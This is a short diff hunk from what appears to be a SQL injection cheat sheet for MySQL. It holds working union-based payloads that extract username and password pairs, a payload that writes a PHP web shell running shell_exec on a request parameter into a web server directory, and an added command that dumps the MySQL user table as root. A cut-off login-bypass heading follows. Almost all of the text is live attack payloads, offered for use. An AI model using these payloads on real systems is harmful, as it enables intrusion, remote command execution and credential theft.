@@ -141,7 +141,8 @@ MySql in-band, union based SQLI exploitation
     *id=1 union select 1,2,3,4,concat(name,0x3a,password),6,7,8,9 FROM users*
     Getting a shell
     *?id=1 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php'*
-
+    Non interactive shell:
+    echo 'use mysql; select * from user;' | mysql -uroot -h127.0.0.1
 
 SQLI login bypass
     *-'
